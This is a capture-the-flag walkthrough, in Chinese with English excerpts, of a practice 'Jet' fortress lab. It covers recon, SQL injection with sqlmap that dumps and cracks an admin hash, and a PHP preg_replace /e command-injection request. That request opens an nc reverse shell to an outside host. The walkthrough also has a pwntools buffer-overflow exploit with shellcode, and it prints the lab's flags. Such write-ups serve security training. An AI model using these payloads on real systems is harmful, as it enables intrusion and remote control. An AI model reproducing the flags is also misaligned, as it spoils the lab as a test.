# Jet

:::note ABOUT Jet

Jet.com is currently looking for Security Engineers in the USA.

Jet’s mission is to become the smartest way to shop and save on pretty much anything. Combining a revolutionary pricing engine, a world-class technology and fulfillment platform, and incredible customer service, we’ve set out to create a new kind of e-commerce.  At Jet, we’re passionate about empowering people to live and work brilliant.

We need super smart engineers from all levels to help us build one of the best engineered e-commerce platforms in the world (big talk we know, but that is our goal!). Our engineers combine creativity, curiosity, and drive to continuously perfect and revolutionize Jet from the inside out. We are looking to bring more intellectually curious engineers who are passionate about technology in general (Jet is a technology first company and prides itself on its culture of learning and knowledge sharing and we want all our engineers to be as passionate as we are!)

The Environment

Our infrastructure is largely built on Microsoft Windows. We have a hybrid configuration with on premise servers and cloud based servers using Microsoft Azure with a large number of additional technologies and middleware. We support three warehouses, a call center, corporate headquarters, and the development environment in the cloud. Our team uses a mix of Windows, Apple, and some Linux for our systems management platforms and cutting edge network equipment. About 50% of the development platform runs on Linux and the rest Windows.

Jet.com 目前正在美国寻找安全工程师。

Jet 的使命是成为购物和节省开销的最智能方式，几乎可以在任何事物上。结合了革命性的定价引擎、世界级的技术及履行平台，以及难以置信的客户服务，我们旨在创造一种全新的电子商务体验。在 Jet，我们热衷于赋予权力给人们，让他们能够更加出色地生活和工作。

我们需要从各个级别的超级聪明的工程师来帮助我们构建世界上最优秀的电子商务平台之一（我们知道这话听起来很夸张，但这就是我们的目标！）。我们的工程师结合创造力、好奇心和动力，不断地完善和革新 Jet，从内而外。我们希望吸引更多对技术充满好奇心的工程师，他们对技术充满热情（Jet 是一家技术优先的公司，并以其学习和知识共享的文化自豪，我们希望我们所有的工程师都像我们一样充满热情！）

环境

我们的基础设施主要建立在 Microsoft Windows 上。我们有一个混合配置，包括本地服务器和使用 Microsoft Azure 的云服务器，还使用了大量其他技术和中间件。我们支持三个仓库、一个呼叫中心、企业总部和云中的开发环境。我们的团队使用 Windows、Apple 和一些 Linux 作为我们的系统管理平台，并使用最先进的网络设备。大约 50% 的开发平台运行在 Linux 上，其余的运行在 Windows 上。
:::

## ENTRY POINT

```plaintext
10.13.37.10
```

## First of all

```shell title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.10"
Nmap scan report for 10.13.37.10
Host is up (0.44s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open          domain       ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
......
```

```shell title="rustscan --ulimit 5000 10.13.37.10"
Open 10.13.37.10:22
Open 10.13.37.10:53
Open 10.13.37.10:80
Open 10.13.37.10:5555
Open 10.13.37.10:7777
Open 10.13.37.10:9201
```

```shell title="sudo nmap -A --min-rate=5000 -T4 -p 22,53,80,5555,7777,9201 10.13.37.10"
Nmap scan report for 10.13.37.10
Host is up (0.40s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http     nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
|_http-server-header: nginx/1.10.3 (Ubuntu)
5555/tcp open  freeciv?
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect:
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|   NULL:
|     enter your name:
|   SMBProgNeg:
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     ......
7777/tcp open  cbt?
| fingerprint-strings:
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe:
|     --==[[Spiritual Memo]]==--
|     Create a memo
|     Show memo
|     Delete memo
|     Can't you read mate?
|   NULL:
|     --==[[Spiritual Memo]]==--
|     Create a memo
|     Show memo
|_    Delete memo
9201/tcp open  http     BaseHTTPServer 0.3 (Python 2.7.12)
```

## Introduction

```plaintext
Lift off with this introductory fortress from Jet! Featuring interesting web vectors and challenges, this fortress is perfect for those getting started.

用这个 Jet 的入门级堡垒起飞吧！特色包括有趣的网页向量和挑战，这个堡垒非常适合刚开始的人。
```

## Connect

```html title="http get 10.13.37.10:80"
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx on Debian!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx on Debian!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working on Debian. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a></p>

<p>
      Please use the <tt>reportbug</tt> tool to report bugs in the
      nginx package with Debian. However, check <a
      href="http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=nginx;repeatmerged=0">existing
      bug reports</a> before reporting a new bug.
</p>

<p><em>Thank you for using debian and nginx.</em></p>
<b>JET{s4n1ty_ch3ck}</b>

</body>
</html>
```

```plaintext title="Flag"
JET{s4n1ty_ch3ck}
```

## Digging in

首先，尝试使用 DNS 服务对本地地址进行反查

```plaintext title="dig @10.13.37.10 -x 10.13.37.10"
; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 15595
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 283 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Wed Mar 06 15:44:00 CST 2024
;; MSG SIZE  rcvd: 109
```

将域名添加到 `/etc/hosts` 记录中

```plaintext title="/etc/hosts"
10.13.37.10 www.securewebinc.jet
10.13.37.10 securewebinc.jet
```

然后进行访问

```html title="http get www.securewebinc.jet"
<!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>SecureWeb Inc. - We design secure websites</title>
    ......
    <section id="contact">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 mx-auto text-center">
            <h2 class="section-heading">Let's Get In Touch!</h2>
            <hr class="my-4">
            <p class="mb-5">Ready to start your next project with us? That's great! Give us a call and we will get back to you as soon as possible!</p>
          </div>
        </div>
        <div class="row">
          <div class="col-lg-4 ml-auto text-center">
            <i class="fa fa-phone fa-3x mb-3 sr-contact"></i>
            <p>123-456-6789</p>
          </div>
          <div class="col-lg-4 mr-auto text-center">
            <i class="fa fa-flag-checkered fa-3x mb-3 sr-contact"></i>
            <p>JET{w3lc0me_4nd_h@v3_fun!}</p>
          </div>
        </div>
      </div>
    </section>
    ......
  </body>

</html>
```

```plaintext title="Flag"
JET{w3lc0me_4nd_h@v3_fun!}
```

## Going Deeper

访问网页

![img](img/image_20240351-155149.png)

在开发者工具的调试工具中，发现一个脚本 `http://www.securewebinc.jet/js/secure.js`

```javascript
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

对脚本中的 ASCII 数据进行解码，得到

```javascript
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

尝试访问

```html title="http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/stats.php"
1709711699
```

尝试进行目录爆破

```plaintext title="dirsearch -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/"
[15:56:33] 302 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/auth.php  ->  login.php
[15:56:38] 301 -  194B  - /dirb_safe_dir_rf9EmcEIx/admin/bower_components  ->  http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/bower_components/
[15:56:38] 301 -  194B  - /dirb_safe_dir_rf9EmcEIx/admin/build  ->  http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/build/
[15:56:48] 302 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/dashboard.php  ->  login.php
[15:56:49] 200 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/db.php
[15:56:51] 301 -  194B  - /dirb_safe_dir_rf9EmcEIx/admin/dist  ->  http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dist/
[15:56:53] 302 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/email.php  ->  login.php
[15:57:06] 302 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/index.php  ->  login.php
[15:57:13] 200 -    3KB - /dirb_safe_dir_rf9EmcEIx/admin/login.php
[15:57:15] 302 -    0B  - /dirb_safe_dir_rf9EmcEIx/admin/logout.php  ->  login.php
[15:57:35] 301 -  194B  - /dirb_safe_dir_rf9EmcEIx/admin/plugins  ->  http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/plugins/
[15:57:59] 301 -  194B  - /dirb_safe_dir_rf9EmcEIx/admin/uploads  ->  http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/uploads/
```

访问 `/dirb_safe_dir_rf9EmcEIx/admin/login.php`

```html title="http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php"
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Secureweb Inc. | Log in</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="/dirb_safe_dir_rf9EmcEIx/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="/dirb_safe_dir_rf9EmcEIx/admin/bower_components/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="/dirb_safe_dir_rf9EmcEIx/admin/bower_components/Ionicons/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="/dirb_safe_dir_rf9EmcEIx/admin/dist/css/AdminLTE.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="/dirb_safe_dir_rf9EmcEIx/admin/plugins/iCheck/square/blue.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="/dirb_safe_dir_rf9EmcEIx/admin/js/html5shiv.min.js"></script>
  <script src="/dirb_safe_dir_rf9EmcEIx/admin/js/respond.min.js"></script>
  <![endif]-->

</head>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <b>Secureweb Inc.</b>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg">
        Authorized use only.
        <br>
        <span class="text-danger">
                </span>
    </p>

    <!-- JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll} -->
    <form action="/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" method="post">
      <div class="form-group has-feedback">
        <input name="username" type="username" class="form-control" placeholder="Username">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input name="password" type="password" class="form-control" placeholder="Password">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="row">
        <div class="col-xs-8">
          <div class="checkbox icheck">
            <label>
              <input type="checkbox"> Remember Me
            </label>
          </div>
        </div>
        <!-- /.col -->
        <div class="col-xs-4">
          <button type="submit" class="btn btn-primary btn-block btn-flat">Sign In</button>
        </div>
        <!-- /.col -->
      </div>
    </form>

  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 3 -->
<script src="/dirb_safe_dir_rf9EmcEIx/admin/bower_components/jquery/dist/jquery.min.js"></script>
<!-- Bootstrap 3.3.7 -->
<script src="/dirb_safe_dir_rf9EmcEIx/admin/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="/dirb_safe_dir_rf9EmcEIx/admin/plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass: 'iradio_square-blue',
      increaseArea: '20%' // optional
    });
  });
</script>
</body>
</html>
```

```plaintext title="Flag"
JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}
```

## Bypassing Authentication

对 `http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php` 登陆界面进行 sql 注入探测

```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch"
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1327 HTTP(s) requests:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=aqFD'||(SELECT 0x63754e76 WHERE 3730=3730 AND (SELECT 3989 FROM(SELECT COUNT(*),CONCAT(0x71766a7071,(SELECT (ELT(3989=3989,1))),0x717a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=aqFD'||(SELECT 0x4e5a4c63 WHERE 2250=2250 AND (SELECT 1236 FROM (SELECT(SLEEP(5)))bfpF))||'&password=
---
```

将数据库提取出来

```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch --dbs"
available databases [2]:
[*] information_schema
[*] jetadmin
```

提取出来数据库中的表

```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin --tables"
Database: jetadmin
[1 table]
+-------+
| users |
+-------+
```

将表中的数据提取出来

```shell title="sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms --random-agent --level=5 --risk=3 --batch -D jetadmin -T users --dump"
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

使用 [CrackStation](https://crackstation.net/) 进行破解

|                               Hash                               |  Type  |      Result      |
| :--------------------------------------------------------------: | :----: | :--------------: |
| 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | sha256 | Hackthesystem200 |

得到凭据

```plaintext
admin:Hackthesystem200
```

使用上面得到的凭据成功登录进系统

![img](img/image_20240332-163259.png)

在系统中就能得到 flag

```plaintext title="Flag"
JET{sQl_1nj3ct1ons_4r3_fun!}
```

## Command

对系统可交互的功能进行探测，发现可用的只有邮件功能

![img](img/image_20240337-163734.png)

对传输的数据进行测试

```plaintext title="Test"
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
Host: www.securewebinc.jet
Content-Length: 332
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h8bqg9jk7kegf983s2of6v7i35
Connection: close

swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40admin.com&subject=admin%40admin.com&message=%3Cp%3Eadmin%40admin.com%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1
```

对 POST 的数据解码进行分析

```plaintext
swearwords[/fuck/i]=make love
&swearwords[/shit/i]=poop
&swearwords[/ass/i]=behind
&swearwords[/dick/i]=penis
&swearwords[/whore/i]=escort
&swearwords[/asshole/i]=bad person
&to=admin@admin.com
&subject=admin
@admin.com&message=<p>admin@admin.com<br></p>
&_wysihtml5_mode=1
```

可以猜测使用到了 `preg_replace` 函数对数据进行分析，尝试构建攻击数据包

```plaintext
swearwords[/fuck/ie]=system('whoami')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=a@a.com&subject=test&message=swearwords[/fuck/]
```

得到

```plaintext
www-data
swearwords[/www-data/]
```

尝试进行反弹 shell

```plaintext
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?shell=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.16.2+9999+>/tmp/f HTTP/1.1
Host: www.securewebinc.jet
Content-Length: 233
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h8bqg9jk7kegf983s2of6v7i35
Connection: close

swearwords[/fuck/ie]=system($_GET["shell"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=a@a.com&subject=test&message=swearwords[/fuck/]
```

成功得到回连的 shell

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[17:23:16] Welcome to pwncat 🐈!
[17:31:24] received connection from 10.13.37.10:49936
[17:31:33] 10.13.37.10:49936: registered new host w/ db
(local) pwncat$ back
(remote) www-data@jet:/var/www/html/dirb_safe_dir_rf9EmcEIx/admin$ whoami
www-data
(remote) www-data@jet:/var/www/html/dirb_safe_dir_rf9EmcEIx/admin$ ls -lh
total 112K
-rw-r--r--  1 root root       33 Dec 20  2017 a_flag_is_here.txt
-rwxr-x---  1 root www-data  157 Jan  3  2018 auth.php
-rwxr-x---  1 root www-data   39 Dec 20  2017 badwords.txt
drwxr-x--- 32 root www-data 4.0K Dec 20  2017 bower_components
drwxr-x---  6 root www-data 4.0K Oct  9  2017 build
-rwxr-x---  1 root www-data   82 Dec 20  2017 conf.php
-rwxr-x---  1 root www-data  44K Dec 27  2017 dashboard.php
-rwxr-x---  1 root www-data  600 Dec 20  2017 db.php
drwxr-x---  5 root www-data 4.0K Oct  9  2017 dist
-rwxr-x---  1 root www-data  820 Dec 27  2017 dologin.php
-rwxr-x---  1 root www-data 2.9K Dec 27  2017 email.php
-rwxr-x---  1 root www-data   43 Dec 20  2017 index.php
drwxr-x---  2 root www-data 4.0K Dec 20  2017 js
-rwxr-x---  1 root www-data 3.6K Dec 20  2017 login.php
-rwxr-x---  1 root www-data   98 Dec 20  2017 logout.php
drwxr-x--- 10 root www-data 4.0K Dec 20  2017 plugins
-rwxr-x---  1 root www-data   21 Nov 14  2017 stats.php
drwxrwxrwx  2 root www-data 4.0K Mar  3 13:38 uploads
```

```plaintext title="Flag"
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
```

## Overflown

进入到 `/home` 目录进行枚举

```shell
(remote) www-data@jet:/home$ ls -lh
total 36K
drwxrwx--- 2 alex          alex          4.0K Jan  3  2018 alex
drwxr-x--- 7 ch4p          ch4p          4.0K Apr  1  2018 ch4p
drwxr-x--- 6 g0blin        g0blin        4.0K Apr  1  2018 g0blin
-rwsr-xr-x 1 alex          alex          8.9K Dec 12  2017 leak
drwxr-x--- 2 membermanager membermanager 4.0K Dec 28  2017 membermanager
drwxr-x--- 2 memo          memo          4.0K Dec 28  2017 memo
drwxr-xr-x 3 tony          tony          4.0K Dec 28  2017 tony
```

可以看到 `/home/leak` 文件有权限进行读取，并且具有 suid 权限

```shell
(remote) www-data@jet:/home$ file /home/leak
/home/leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
```

将文件下载到本地

```shell
(local) pwncat$ download /home/leak
/home/leak ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 9.1/9.1 KB • ? • 0:00:00
[17:37:50] downloaded 9.11KiB in 2.11 seconds
```

对其进行反编译分析

### `/home/leak` 反编译分析

```c title="main"
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  _init(argc, argv, envp);
  printf("Oops, I'm leaking! %p\n", s);
  puts(aPwnMe);
  printf(">");
  fgets(s, 512, stdin);
  return 0;
}
```

很明显存在栈溢出，尝试利用

Shellcode 参考自 [Linux/x86-64 - Execute /bin/sh - 27 bytes](http://shell-storm.org/shellcode/files/shellcode-806.html)

首先，先将程序映射到自定义端口

```shell
socat TCP4-LISTEN:12344,reuseaddr,fork EXEC:/home/leak
```

确定映射成功，攻击机通过 `netcat` 可以与之交互后，使用脚本进行攻击

```python
from pwn import *

p = remote("10.13.37.10", 12344)

p.recvuntil("Oops, I'm leaking! ")
leak_addr = int(p.recvuntil("\n"), 16)
print(hex(leak_addr))
p.recvuntil(">")

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf = shellcode+ "\x90" * (72 - len(shellcode)) + p64(leak_addr, endianness="little")
p.sendline(buf)
p.interactive()
```

:::note

Python2 脚本

:::

成功建立会话，user 为 `alex`

```shell
(py2) ┌─[randark@parrot]─[~/tmp]
└──╼ $ python2 test.py
[+] Opening connection to 10.13.37.10 on port 12344: Done
0x7ffff6b2ac30
[*] Switching to interactive mode
$ whoami
alex
```

在 alex 的用户目录中，得到 flag

```shell
$ ls -lh /home/alex
total 20K
-rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
-rw-r--r-- 1 root root 1.5K Dec 28  2017 encrypted.txt
-rw-r--r-- 1 root root 7.2K Dec 27  2017 exploitme.zip
-rw-r--r-- 1 root root   27 Dec 28  2017 flag.txt
$ cat /home/alex/flag.txt
JET{0v3rfL0w_f0r_73h_lulz}
```

```plaintext title="Flag"
JET{0v3rfL0w_f0r_73h_lulz}
```

## Secret Message

在 alex 的用户目录中，还有一些文件

```python title="/home/alex/crypter.py"
import binascii

def makeList(stringVal):
    list = []
    for c in stringVal:
        list.append(c)
    return list

def superCrypt(stringVal,keyVal):
    keyPos = 0
    key = makeList(keyVal)
    xored = []
    for c in stringVal:
        xored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))
        if keyPos == len(key) - 1:
            keyPos = 0
        else:
            keyPos += 1
    hexVal = ''
    for n in xored:
        hexVal += n
    return hexVal

with open('message.txt') as f:
    content = f.read()

key = sys.argv[1]

with open('encrypted.txt', 'w') as f:
    output = f.write(binascii.unhexlify(superCrypt(content, key)))
```

```plaintext title="/home/alex/encrypted.txt Base64 Encodeed"
OwAPGR1FGgQWDE9peCkKGQAHRQwTUgQbCUIIAEMbAhMEAQcEDQFSAx4LBgAABFIdBgwSAQEKGxVF
GBAQSRkGEBwKHxZJRS8aFQwZRQsaThMAAA0OUwcKQyYjKVcMDAMLAAYGDAVSUyQQHlIRHwBCDQsV
FwMMGxYBFkMBHUURDBpJBxdSDhAKA1JvaScXAhYXBgAABFIWDB4BUxERFBsLHgsFSQMCBgoRAhIf
SUM8UgQTAQcNThcaCkMfBBxFARwcBAUMBxpOBR0dQx8bFkUREB8KAwBCDBYTHgAKHxIHDAwbUhEF
BAsHBw0VTwoFUxYdExkdDAMIB0cUCgJBQz8bFkUTFAEWAAoQDU4KAU8XAxZTFgIYF0UAAEIcHQZS
GwxLFh0GEQwCEVcKFxtOAB0CDh4dGgYCARsKGRZMYyMCGQpDGAYBAEMBGgoEAEILBw0THQoOAFME
ERBSDhIVFkkdAhQKQmF5JwpDGBMOEkUbBhsRUgMKDRZTAAIGGwAFRStJBgIECkMKHwEAAhELRQQV
Ax4ABhZPCgUABwQNFhcWVwoESRoLF08VHh8dABEUEAkSRQAAAAIABgYYUx8MEAEXCx4LBUkBDVIA
FhlTAAARAxcXWW9oPQYGUh8MGQcARQIHF0VCUFdcTgIcC0NcRERSTX86BAEAQg8bDVIODQ9TGAAG
BVIMA0URCAgGU2VpITYnHhFGAlYWEVMHCTwRB1cZACxUDSoBVBoVDloxG0IdPAxABxY8DEIQKFUV
B10HD2VpYTAbAAYHAUVaRSMFCxt4ZU5GXl5ITlhfSFpIT0RDTl9CTkZeXkhOWF9IWkhPRENOX0JO
Rl5eSE5YX0haSE9EQ05fQk5GXl5ITlhfSFpIT0RDTl9CTkZeXkhOWF9IfTEKAB1DFwICAh9TBA0R
UgQZHEIPBw8XHEMfARILEBgbEQMABkkZCgYHQwIHUwQREFIGGAsEAAoGHBsKCh9TBA0RUgwZEQcH
CgYWTxAEHxYJGlUUCgVFFgELQwccBkscFUUXHRdFHgsGABgKFhoCB1McF0MQHBEeERtJGgxSGAsE
HlMRCxALRRYXB0kPBxYdBhgAFgFNVTsDVxwNHE4LExkGSwEWBgYcBAATRRYBBxBSCg4KGh9FChtS
AAUXDRtOEx4KAhgWUwsMARsDDkUWAQtDARYQHxYeRQ4UHAQQABBHTjcaBhBLHhYWEBQVAFcGDQca
AhsBEEsQHAsFHBYAGRELCAJDGwEFBAEeBBccHQtXBAwNTgoBTwoFBxYLBxAWRRgLDhBOBR0dQx8b
FkUKGxYMAQwGHA8PUgECBhYXS0M8FEUOChdJDxEXTw0EB1MRCxBSCxYIBw1OAhYLEQ4AAAAGVQsK
AkURAQEWHgtDBRwHRQccARYSCAsHDxcXQ0MPGgARERwQEAMAQgYcQxEAExJTBw0KBlIAWggDAAJN
Uj8PDhIAAEMbHREeAxtJGgsXTxAOHRcAEVUbCBoABgAPFxcDGksRCkUGWB8EHglCAAhDCwAWSxsS
EwZVAAAUAAsfCwdSGwsCAFMAThgTDBtFABBODhscFwoYFkUCGxZFEwAODBoGUhsLAgBTAE4YEwwb
